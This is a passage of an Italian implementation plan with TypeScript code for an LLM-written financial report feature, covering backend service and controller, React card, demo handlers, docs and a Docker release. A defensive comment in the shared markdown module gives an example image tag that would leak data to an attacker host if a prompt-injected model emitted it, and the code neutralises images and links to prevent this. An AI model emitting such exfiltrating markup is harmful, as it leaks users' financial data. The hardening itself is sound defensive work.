  }

  private keyOf(userId: string, params: LlmReportParams): LlmReportKey {
    if (params.scope === 'monthly' && !params.month) {
      throw new BadRequestException('Il report mensile richiede il mese.');
    }
    return {
      userId,
      scope: params.scope,
      periodKey: buildPeriodKey(params.scope, params.year, params.month),
      accountsKey: buildAccountsKey(params.accountIds),
    };
  }

  private async runGeneration(
    userId: string,
    params: LlmReportParams,
    key: LlmReportKey,
  ): Promise<void> {
    const startedAt = Date.now();
    try {
      const config = await this.llmConfig.getActiveConfig();
      if (!config.model) {
        throw new ServiceUnavailableException(
          'Nessun modello LLM configurato: scegline uno in Impostazioni → Modello AI.',
        );
      }
      const snapshot = await this.buildSnapshot(userId, params);
      const content = (await this.callLlm(config, buildReportPrompt(snapshot))).trim();
      if (!content) {
        throw new ServiceUnavailableException(
          `Il modello "${config.model}" non ha prodotto testo. Riprova o cambia modello nelle Impostazioni.`,
        );
      }
      await this.prisma.llmReport.update({
        where: { userId_scope_periodKey_accountsKey: key },
        data: {
          status: LlmReportStatus.ready,
          content,
          provider: config.provider,
          model: config.model,
          dataFingerprint: buildFingerprint(snapshot.totals),
          errorMessage: null,
          completedAt: new Date(),
        },
      });
      this.logger.log(
        `Report LLM ${key.scope} ${key.periodKey} generato in ${Math.round((Date.now() - startedAt) / 1000)}s (${config.provider} ${config.model})`,
      );
    } catch (e) {
      const message = describeError(e);
      this.logger.warn(
        `Report LLM ${key.scope} ${key.periodKey} fallito dopo ${Math.round((Date.now() - startedAt) / 1000)}s: ${message}`,
      );
      await this.prisma.llmReport
        .update({
          where: { userId_scope_periodKey_accountsKey: key },
          data: {
            status: LlmReportStatus.error,
            errorMessage: message,
            completedAt: new Date(),
          },
        })
        // Se anche la scrittura dell'errore fallisce (DB giù) non resta che
        // loggare: il lock scaduto rimetterà comunque la cella in gioco.
        .catch((err) => this.logger.error(`Impossibile salvare l'errore del report: ${describeError(err)}`));
    }
  }

  private async callLlm(config: ActiveLlmConfig, prompt: string): Promise<string> {
    if (config.provider === 'opencode') {
      if (!config.apiKey || !config.tier) {
        throw new ServiceUnavailableException(
          'OpenCode è il provider attivo ma manca la API key: configurala in Impostazioni.',
        );
      }
      // Niente `temperature`: alcuni modelli reasoning la rifiutano.
      return this.opencode.chat(config.tier, config.apiKey, {
        model: config.model,
        messages: [{ role: 'user', content: prompt }],
      });
    }
    if (!this.ollama) {
      throw new ServiceUnavailableException('Server Ollama non configurato (OLLAMA_BASE_URL mancante).');
    }
    const res = await this.ollama.chat({
      model: config.model,
      messages: [{ role: 'user', content: prompt }],
      keep_alive: OLLAMA_KEEP_ALIVE,
      options: { temperature: 0.3, num_ctx: 8192 },
    });
    return res.message?.content ?? '';
  }

  private async buildSnapshot(userId: string, params: LlmReportParams): Promise<ReportSnapshot> {
    const { scope, year, month, accountIds } = params;
    const { from, to } = periodRange(scope, year, month);
    const prev = previousPeriodRange(scope, year, month);

    const [totals, previousTotals, expenseTree, incomeTree, topExpenses, series] = await Promise.all([
      this.reports.periodTotals(userId, from, to, accountIds),
      this.reports.periodTotals(userId, prev.from, prev.to, accountIds),
      this.reports.categoryBreakdownTree(userId, from, to, accountIds, undefined, 'expense'),
      this.reports.categoryBreakdownTree(userId, from, to, accountIds, undefined, 'income'),
      this.reports.topTransactions(userId, from, to, accountIds),
      scope === 'annual'
        ? this.reports
            .monthlyAggregates(userId, year, accountIds)
            .then((rows) =>
              rows.map((m) => ({
                label: String(m.month).padStart(2, '0'),
                incomeCents: m.incomeCents,
                expenseCents: m.expenseCents,
              })),
            )
        : this.reports
            .dailyTimeSeries(userId, from, to, accountIds)
            .then((rows) =>
              rows.map((d) => ({
                label: d.date.slice(8, 10),
                incomeCents: d.incomeCents,
                expenseCents: d.expenseCents,
              })),
            ),
    ]);

    return {
      scope,
      label: periodLabel(scope, year, month),
      previousLabel:
        scope === 'annual'
          ? periodLabel('annual', year - 1)
          : periodLabel('monthly', prev.from.getUTCFullYear(), prev.from.getUTCMonth() + 1),
      // Niente nomi di conto: servirebbe una query ACL in più per un dettaglio
      // che il report non usa davvero.
      accountsLabel:
        accountIds && accountIds.length > 0 ? `${accountIds.length} conti selezionati` : 'tutti i conti',
      totals,
      previousTotals,
      series,
      expenseTree,
      incomeTree,
      topExpenses,
    };
  }
}

function emptyView(): LlmReportView {
  return {
    status: 'missing',
    content: null,
    generatedAt: null,
    provider: null,
    model: null,
    stale: false,
    elapsedSeconds: null,
    errorMessage: null,
  };
}

/** Tira fuori anche la `cause`: il fetch di Node dice "fetch failed" e nasconde il motivo vero. */
function describeError(e: unknown): string {
  const err = e as Error & { cause?: unknown };
  const cause = err?.cause instanceof Error ? ` (${err.cause.message})` : '';
  return `${err?.message ?? String(e)}${cause}`;
}

/** Fetch con tetto di tempo per la singola chiamata a Ollama. */
const fetchWithTimeout: typeof fetch = (input, init) =>
  fetch(input, { ...init, signal: AbortSignal.timeout(OLLAMA_TIMEOUT_MS) });
```

- [ ] **Step 3: Controller**

Crea `backend/src/llm-reports/llm-reports.controller.ts`:

```ts
import { Body, Controller, Get, HttpCode, Post, Query } from '@nestjs/common';
import { Throttle } from '@nestjs/throttler';
import { AuthUser, CurrentUser } from '../common/decorators/current-user.decorator';
import { GenerateLlmReportDto, LlmReportQueryDto } from './dto/llm-report.dto';
import { LlmReportsService } from './llm-reports.service';

@Controller('reports/llm')
export class LlmReportsController {
  constructor(private readonly service: LlmReportsService) {}

  /** Sola lettura: un GET che scatena lavoro e costi sarebbe una trappola per prefetch e retry. */
  @Get()
  status(@CurrentUser() user: AuthUser, @Query() query: LlmReportQueryDto) {
    return this.service.getStatus(user.id, query);
  }

  /** Ogni chiamata costa una generazione LLM: tetto stretto anche se il lock già protegge. */
  @Throttle({ default: { ttl: 60_000, limit: 10 } })
  @Post('generate')
  @HttpCode(202)
  generate(@CurrentUser() user: AuthUser, @Body() body: GenerateLlmReportDto) {
    return this.service.requestGeneration(user.id, body, body.force === true);
  }
}
```

- [ ] **Step 4: Modulo e registrazione**

Crea `backend/src/llm-reports/llm-reports.module.ts`:

```ts
import { Module } from '@nestjs/common';
import { LlmChatModule } from '../llm-chat/llm-chat.module';
import { ReportsModule } from '../reports/reports.module';
import { LlmReportsController } from './llm-reports.controller';
import { LlmReportsService } from './llm-reports.service';

/**
 * Modulo autonomo, non una sottocartella di `reports/`: `LlmChatModule` importa
 * già `ReportsModule` (i tool della chat leggono i report), quindi far
 * dipendere `ReportsModule` da `LlmChatModule` creerebbe un ciclo. Qui
 * importiamo entrambi e non siamo importati da nessuno.
 */
@Module({
  imports: [ReportsModule, LlmChatModule],
  controllers: [LlmReportsController],
  providers: [LlmReportsService],
})
export class LlmReportsModule {}
```

In `backend/src/app.module.ts`: aggiungi l'import in cima

```ts
import { LlmReportsModule } from './llm-reports/llm-reports.module';
```

e la voce nell'array `imports`, subito dopo `LlmChatModule,`:

```ts
    LlmReportsModule,
```

- [ ] **Step 5: Verificare compilazione e test**

Run: `cd backend && npm run build && npx jest`
Expected: build senza errori; tutti i test (inclusi i due nuovi file spec) PASS

- [ ] **Step 6: Commit**

```bash
git add backend/src/llm-reports backend/src/app.module.ts
git commit -m "report llm: endpoint di stato e generazione con lock a DB"
```

---

### Task 5: Client API frontend + markdown condiviso

**Files:**
- Create: `frontend/src/components/shared/markdown.tsx`
- Modify: `frontend/src/features/chat/ChatPage.tsx` (rimuovere la costante locale, importare quella condivisa)
- Create: `frontend/src/features/reports/reportsLlmApi.ts`

**Interfaces:**
- Consumes: `api` da `@/lib/api/client`; il payload `LlmReportView` del Task 4
- Produces: `MARKDOWN_COMPONENTS`, `llmReportsApi.get()`, `llmReportsApi.generate()`, tipi `LlmReportView` e `LlmReportParams`

- [ ] **Step 1: Estrarre il markdown hardening**

Crea `frontend/src/components/shared/markdown.tsx`:

```tsx
import type { ReactNode } from 'react';

/**
 * Hardening del Markdown prodotto dall'LLM: il modello può aver letto testo non
 * fidato (causali bancarie, descrizioni importate da CSV), quindi immagini e
 * link vengono neutralizzati — un `![](https://attaccante/?dati)` renderizzato
 * esfiltrerebbe dati al solo caricamento, e un link cliccabile è phishing.
 * Le immagini spariscono, i link restano come testo inerte.
 * Usato dalla chat e dal report LLM della pagina Report.
 */
export const MARKDOWN_COMPONENTS = {
  img: () => null,
  a: ({ children }: { children?: ReactNode }) => <span className="underline">{children}</span>,
};
```

In `frontend/src/features/chat/ChatPage.tsx`: cancella la costante locale `MARKDOWN_COMPONENTS` (con il suo commento) e aggiungi l'import

```tsx
import { MARKDOWN_COMPONENTS } from '@/components/shared/markdown';
```

Se dopo la rimozione `ReactNode` non è più usato in `ChatPage.tsx`, togli anche quel type import (lo segnalerà il lint).

- [ ] **Step 2: Client API**

Crea `frontend/src/features/reports/reportsLlmApi.ts`:

```ts
import { api } from '@/lib/api/client';

export type LlmReportScope = 'annual' | 'monthly';

export interface LlmReportParams {
  scope: LlmReportScope;
  year: number;
  month?: number;
  accountIds?: string[];
}

export interface LlmReportView {
  status: 'missing' | 'generating' | 'ready' | 'error';
  content: string | null;
  generatedAt: string | null;
  provider: string | null;
  model: string | null;
  /** I dati del periodo sono cambiati dopo la generazione. */
  stale: boolean;
  elapsedSeconds: number | null;
  errorMessage: string | null;
}

export const llmReportsApi = {
  get: (p: LlmReportParams) =>
    api
      .get('reports/llm', {
        searchParams: buildParams(p),
      })
      .json<LlmReportView>(),

  /** 202 se la generazione parte, 409 se è già in corso o serve la conferma. */
  generate: (p: LlmReportParams, force: boolean) =>
    api
      .post('reports/llm/generate', { json: { ...p, force } })
      .json<{ status: 'generating' }>(),
};

function buildParams(p: LlmReportParams): URLSearchParams {
  const params = new URLSearchParams();
  params.set('scope', p.scope);
  params.set('year', String(p.year));
  if (p.month !== undefined) params.set('month', String(p.month));
  for (const id of p.accountIds ?? []) params.append('accountIds', id);
  return params;
}
```

- [ ] **Step 3: Verificare che compili**

Run: `cd frontend && npx tsc -b`
Expected: nessun errore

- [ ] **Step 4: Commit**

```bash
git add frontend/src/components/shared/markdown.tsx frontend/src/features/chat/ChatPage.tsx frontend/src/features/reports/reportsLlmApi.ts
git commit -m "report llm: client API e markdown hardening condiviso con la chat"
```

---

### Task 6: `LlmReportCard` e integrazione nella pagina Report

**Files:**
- Create: `frontend/src/features/reports/LlmReportCard.tsx`
- Modify: `frontend/src/features/reports/ReportsPage.tsx` (montare la card in annuale e mensile)

**Interfaces:**
- Consumes: `llmReportsApi`, `LlmReportView` (Task 5); `MARKDOWN_COMPONENTS` (Task 5); `useConfirm` da `@/components/shared/confirm`
- Produces: `<LlmReportCard scope year month? accountIds accountIdsKey />`

- [ ] **Step 1: Scrivere la card**

Crea `frontend/src/features/reports/LlmReportCard.tsx`:

```tsx
import { useEffect, useRef, useState } from 'react';
import { useMutation, useQuery, useQueryClient } from '@tanstack/react-query';
import { HTTPError } from 'ky';
import ReactMarkdown from 'react-markdown';
import { Loader2, RefreshCw, Sparkles } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { MARKDOWN_COMPONENTS } from '@/components/shared/markdown';
import { useConfirm } from '@/components/shared/confirm';
import { llmReportsApi, type LlmReportScope } from './reportsLlmApi';

interface Props {
  scope: LlmReportScope;
  year: number;
  /** Solo per lo scope mensile. */
  month?: number;
  accountIds: string[];
  /** Elenco ordinato: chiave di cache stabile a prescindere dall'ordine di selezione. */
  accountIdsKey: string[];
}

/** Ogni quanto ricontrollare lo stato mentre la generazione è in corso. */
const POLL_MS = 3000;

export function LlmReportCard({ scope, year, month, accountIds, accountIdsKey }: Props) {
  const confirm = useConfirm();
  const queryClient = useQueryClient();
  const params = { scope, year, month, accountIds: accountIds.length > 0 ? accountIds : undefined };
  const queryKey = ['report', 'llm', scope, year, month ?? null, accountIdsKey];

  const query = useQuery({
    queryKey,
    queryFn: () => llmReportsApi.get(params),
    // Polling SOLO mentre sta generando: fuori da lì la riga non cambia da sola.
    refetchInterval: (q) => (q.state.data?.status === 'generating' ? POLL_MS : false),
    refetchOnWindowFocus: true,
  });

  const generate = useMutation({
    mutationFn: (force: boolean) => llmReportsApi.generate(params, force),
    onSuccess: () => queryClient.invalidateQueries({ queryKey }),
    onError: (e) => {
      // 409 = un'altra scheda (o un altro dispositivo) ha già il lock: non è un
      // errore per l'utente, basta rimettersi in ascolto.
      if (e instanceof HTTPError && e.response.status === 409) {
        void queryClient.invalidateQueries({ queryKey });
      }
    },
  });

  const data = query.data;
  const status = data?.status;
  const isGenerating = status === 'generating' || generate.isPending;

  // Generazione automatica alla prima apertura di un periodo senza report.
  // Il set tiene traccia di cosa abbiamo già avviato in questa sessione: senza,
  // un refetch che torna ancora `missing` la farebbe ripartire in loop.
  const autoStarted = useRef<Set<string>>(new Set());
  const autoKey = queryKey.join('|');
  useEffect(() => {
    if (status !== 'missing') return;
    if (autoStarted.current.has(autoKey)) return;
    autoStarted.current.add(autoKey);
    generate.mutate(false);
    // `generate` è stabile per React Query, non va nelle dipendenze.
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [status, autoKey]);

  // Cronometro: il server dice da quanti secondi genera, noi aggiungiamo il
  // tempo passato dall'ultima risposta così il numero sale ogni secondo.
  const [, forceTick] = useState(0);
  useEffect(() => {
    if (!isGenerating) return;
    const id = window.setInterval(() => forceTick((t) => t + 1), 1000);
    return () => window.clearInterval(id);
  }, [isGenerating]);
  const elapsed =
    data?.elapsedSeconds != null
      ? data.elapsedSeconds + Math.max(0, Math.round((Date.now() - query.dataUpdatedAt) / 1000))
      : 0;

  const onGenerate = async () => {
    if (isGenerating) return;
    if (data?.content) {
      const ok = await confirm({
        title: 'Rigenerare il report?',
        description: `Il report attuale${
          data.generatedAt ? ` (generato il ${formatDateTime(data.generatedAt)})` : ''
        } verrà sovrascritto e non sarà più recuperabile.`,
        confirmLabel: 'Rigenera',
        destructive: true,
      });
      if (!ok) return;
      generate.mutate(true);
      return;
    }
    generate.mutate(false);
  };

  return (
    <Card>
      <CardHeader className="flex flex-row items-start justify-between gap-3 space-y-0">
        <div className="space-y-1">
          <CardTitle className="text-base flex items-center gap-2">
            <Sparkles className="h-4 w-4 text-primary" />
            Report dell'assistente
          </CardTitle>
          <CardDescription>
            {isGenerating
              ? `Sto scrivendo il report… ${formatElapsed(elapsed)}`
              : status === 'ready' && data?.generatedAt
                ? `Generato il ${formatDateTime(data.generatedAt)}${data.model ? ` · ${data.model}` : ''}`
                : 'Analisi del periodo scritta dal modello selezionato nelle impostazioni'}
          </CardDescription>
        </div>
        <Button
          variant="outline"
          size="sm"
          onClick={onGenerate}
          disabled={isGenerating}
          className="shrink-0"
        >
          {isGenerating ? (
            <>
              <Loader2 className="mr-2 h-4 w-4 animate-spin" />
              In generazione…
            </>
          ) : (
            <>
              <RefreshCw className="mr-2 h-4 w-4" />
              {data?.content ? 'Rigenera' : 'Genera'}
            </>
          )}
        </Button>
      </CardHeader>
      <CardContent className="space-y-3">
        {data?.stale && !isGenerating && (
          <p className="rounded-md bg-amber-500/10 px-3 py-2 text-xs text-amber-600 dark:text-amber-400">
            I movimenti del periodo sono cambiati dopo la generazione: il report potrebbe non essere aggiornato.
          </p>
        )}

        {isGenerating && !data?.content && <ReportSkeleton />}

        {isGenerating && data?.content && (
          <div className="opacity-40 transition-opacity">
            <MarkdownReport content={data.content} />
          </div>
        )}

        {!isGenerating && status === 'error' && (
          <p className="rounded-md bg-destructive/10 px-3 py-2 text-sm text-destructive">
            {data?.errorMessage ?? 'Generazione fallita.'}
          </p>
        )}

        {/* Il testo si mostra anche in stato `error`: un lock scaduto sopra un
            report gia' scritto non deve far sparire il report. */}
        {!isGenerating && data?.content && <MarkdownReport content={data.content} />}

        {!isGenerating && !data?.content && status === 'missing' && (
          <p className="text-sm text-muted-foreground">Nessun report per questo periodo.</p>
        )}
      </CardContent>
    </Card>
  );
}

function MarkdownReport({ content }: { content: string }) {
  return (
    <div className="prose prose-sm dark:prose-invert max-w-none">
      <ReactMarkdown components={MARKDOWN_COMPONENTS}>{content}</ReactMarkdown>
    </div>
  );
}

/** Righe fantasma pulsanti: rende visibile che c'è del lavoro in corso. */
function ReportSkeleton() {
  const widths = ['w-1/3', 'w-full', 'w-11/12', 'w-4/5', 'w-1/4', 'w-full', 'w-3/4'];
  return (
    <div className="space-y-2" aria-hidden>
      {widths.map((w, i) => (
        <div key={i} className={`h-3 animate-pulse rounded bg-muted ${w}`} />
      ))}
    </div>
  );
}

function formatElapsed(seconds: number): string {
  if (seconds < 60) return `${seconds}s`;
  return `${Math.floor(seconds / 60)}m ${String(seconds % 60).padStart(2, '0')}s`;
}

function formatDateTime(iso: string): string {
  return new Date(iso).toLocaleString('it-IT', {
    day: '2-digit',
    month: '2-digit',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
  });
}
```

- [ ] **Step 2: Montare la card nella pagina**

In `frontend/src/features/reports/ReportsPage.tsx` aggiungi l'import:

```tsx
import { LlmReportCard } from './LlmReportCard';
```

Nel blocco `mode === 'annual'`, subito **dopo** il `</div>` che chiude la griglia delle card KPI e **prima** della `<Card>` "Mensile":

```tsx
              <LlmReportCard
                scope="annual"
                year={year}
                accountIds={accountIds}
                accountIdsKey={accountIdsKey}
              />
```

Nel blocco `mode === 'monthly'`, nello stesso punto (dopo la griglia KPI, prima della `<Card>` "Andamento giornaliero"):

```tsx
              <LlmReportCard
                scope="monthly"
                year={year}
                month={month}
                accountIds={accountIds}
                accountIdsKey={accountIdsKey}
              />
```

- [ ] **Step 3: Verificare build e lint**

Run: `cd frontend && npx tsc -b && npm run lint`
Expected: nessun errore

- [ ] **Step 4: Commit**

```bash
git add frontend/src/features/reports/LlmReportCard.tsx frontend/src/features/reports/ReportsPage.tsx
git commit -m "report llm: card con animazione di generazione e conferma di sovrascrittura"
```

---

### Task 7: Handler demo

**Files:**
- Modify: `frontend/src/lib/demo/handlers.ts`

**Interfaces:**
- Consumes: `matches()` già presente nel file; il payload `LlmReportView` (Task 5)
- Produces: risposte demo per `GET reports/llm` e `POST reports/llm/generate`

- [ ] **Step 1: Aggiungere gli handler**

In `frontend/src/lib/demo/handlers.ts`, dentro `demoHandle`, vicino agli altri handler dei report. **Prima** il POST: `matches(pathname, 'reports/llm')` matcherebbe anche `reports/llm/generate`.

```ts
  // Report LLM: in demo il testo è statico e la generazione è un no-op —
  // nessuna chiamata al modello, ma la UI resta completa.
  if (matches(pathname, 'reports/llm/generate') && method === 'POST') {
    return { status: 'generating' };
  }
  if (matches(pathname, 'reports/llm') && method === 'GET') {
    return {
      status: 'ready',
      content: DEMO_LLM_REPORT,
      generatedAt: new Date().toISOString(),
      provider: 'demo',
      model: 'demo-model',
      stale: false,
      elapsedSeconds: null,
      errorMessage: null,
    };
  }
```

E in fondo al file, accanto alle altre costanti:

```ts
/** Testo di esempio del report LLM in modalità demo. */
const DEMO_LLM_REPORT = `## Sintesi
Nel periodo hai incassato più di quanto hai speso: il saldo resta positivo e in linea con il periodo precedente.

## Andamento
Le uscite si concentrano nella prima metà del periodo, con un picco in corrispondenza delle spese fisse.

## Dove sono finiti i soldi
La voce più pesante è **Casa**, seguita da **Spesa** e **Trasporti**.

## Cosa mi ha colpito
Un singolo movimento vale da solo quasi un terzo delle uscite del periodo.

## Consigli
- Tieni d'occhio la categoria con la crescita più marcata rispetto al periodo precedente.
- Verifica che le spese ricorrenti siano tutte ancora utili.
- Metti da parte la differenza tra entrate e uscite appena arriva l'accredito.

*(testo di esempio: in modalità demo il modello non viene interrogato)*`;
```

- [ ] **Step 2: Verificare in demo**

Run: `cd frontend && npx tsc -b && npm run lint`
Expected: nessun errore. (La verifica visiva della demo avviene con l'app in esecuzione, nel Task 9.)

- [ ] **Step 3: Commit**

```bash
git add frontend/src/lib/demo/handlers.ts
git commit -m "report llm: handler demo per stato e generazione"
```

---

### Task 8: Grafo di conoscenza, manuale e bump di versione

**Files:**
- Modify: `docs/knowledge-graph/Pagina Report.md`
- Modify: `docs/knowledge-graph/Database.md`
- Modify: `docs/knowledge-graph/API.md`
- Modify: `docs/knowledge-graph/Backend.md`
- Modify: `docs/knowledge-graph/Chat LLM.md` (il report LLM è un secondo consumatore del provider attivo)
- Modify: `docs/knowledge-graph/Registro Modifiche.md`
- Modify: `docs/MANUALE.md`
- Modify: `backend/package.json`, `frontend/package.json` (versione `0.10.0`)

**Interfaces:**
- Consumes: tutto il lavoro dei task precedenti
- Produces: documentazione allineata, versione pronta per il rilascio

- [ ] **Step 1: Aggiornare le note del grafo**

Regole: note **sintetiche e fattuali**, percorsi file reali, niente dump di codice, wikilink tra note correlate. Contenuti minimi da inserire:

- `Pagina Report.md`: nuova sezione "Report LLM" — cosa fa, dove sta (`features/reports/LlmReportCard.tsx`, `reportsLlmApi.ts`), lazy alla prima apertura, lock a DB che sopravvive a navigazione e riavvio, badge "dati cambiati", conferma di sovrascrittura, link a [[Chat LLM]] e [[Database]].
- `Database.md`: modello `LlmReport` + enum `LlmReportStatus`, chiave unica `(userId, scope, periodKey, accountsKey)` usata come lock.
- `API.md`: `GET /reports/llm` e `POST /reports/llm/generate` (202/409).
- `Backend.md`: riga `llm-reports/` nella tabella dei moduli, con la nota sul perché è un modulo a sé (ciclo con `LlmChatModule`).
- `Chat LLM.md`: una riga nel punto in cui si elencano i consumatori del provider attivo (`CategoryAiService` e ora il report LLM).
- `Registro Modifiche.md`: riga con data 2026-08-31, cosa è stato fatto, file principali.

- [ ] **Step 2: Aggiornare il manuale utente**

In `docs/MANUALE.md`, nella sezione della pagina Report: cosa fa il report dell'assistente, che si genera da solo la prima volta, che rigenerarlo sovrascrive il precedente, e che il testo dipende dal modello scelto nelle impostazioni.

- [ ] **Step 3: Bump di versione**

Porta `version` a `0.10.0` in `backend/package.json` e `frontend/package.json` (feature nuova, non un fix).

- [ ] **Step 4: Verifica completa**

Run:
```bash
cd backend && npm run build && npx jest && npm run lint
cd ../frontend && npx tsc -b && npm run lint
```
Expected: tutto verde. Riportare l'output reale, non "dovrebbe funzionare".

- [ ] **Step 5: Commit**

```bash
git add docs backend/package.json frontend/package.json
git commit -m "v0.10.0: report LLM per periodo nella pagina Report"
```

---

### Task 9: Rilascio (richiesto esplicitamente dall'utente)

**Files:** nessuno modificato — sono operazioni di deploy.

Riferimento: `docs/knowledge-graph/Deploy e Versioning.md`.

- [ ] **Step 1: Push**

```bash
git push origin develop
```

- [ ] **Step 2: Backup del database prima del cambio schema**

Il CMD di produzione esegue `prisma db push --accept-data-loss` all'avvio: il backup va fatto **prima** di far partire il backend nuovo.

```bash
cd /home/jarvis/workspace/finance-manager
docker compose exec -T postgres pg_dump -U "$POSTGRES_USER" -Fc "$POSTGRES_DB" \
  > "finance-manager-db-backup-$(date +%Y-%m-%d_%H%M%S).dump"
```
(usare utente e database reali letti da `.env`; verificare che il file risultante non sia vuoto con `ls -lh`)

- [ ] **Step 3: Tag delle immagini correnti (punto di rollback)**

```bash
docker tag finance-manager-backend:latest finance-manager-backend:0.9.5
docker tag finance-manager-frontend:latest finance-manager-frontend:0.9.5
```

- [ ] **Step 4: Build**

```bash
docker compose build backend frontend
```

- [ ] **Step 5: Tag della nuova versione e avvio**

```bash
docker tag finance-manager-backend:latest finance-manager-backend:0.10.0
docker tag finance-manager-frontend:latest finance-manager-frontend:0.10.0
docker compose up -d backend frontend
```

- [ ] **Step 6: Verificare che sia su**

```bash
docker compose ps
curl -fsS localhost:${HTTP_PORT:-80}/api/health
docker compose logs --tail=50 backend
```
Expected: container `Up`, health OK, nei log la creazione della tabella `llm_reports` da parte di `prisma db push` e nessuna eccezione.

- [ ] **Step 7: Export dei `.tar` versionati**

```bash
docker save finance-manager-backend:0.10.0 -o docker-images-amd64/finance-manager-backend-amd64-0.10.0.tar
docker save finance-manager-frontend:0.10.0 -o docker-images-amd64/finance-manager-frontend-amd64-0.10.0.tar
```
(mai sovrascrivere i `.tar` esistenti)

---

## Note per chi esegue

- **Non inventare fallback silenziosi.** Se l'LLM non risponde, lo stato deve andare a `error` con il messaggio vero: la chat ha già pagato caro il "silenzio invece dell'errore" (v0.9.4).
- **Il lock è il punto del task.** Se in dubbio su una modifica al claim, ricorda il requisito: premuto una volta il pulsante, non deve essere ripremibile nemmeno uscendo e rientrando dalla pagina, da nessun dispositivo.
- **Niente `window.confirm`**: la conferma di sovrascrittura passa da `useConfirm()`.
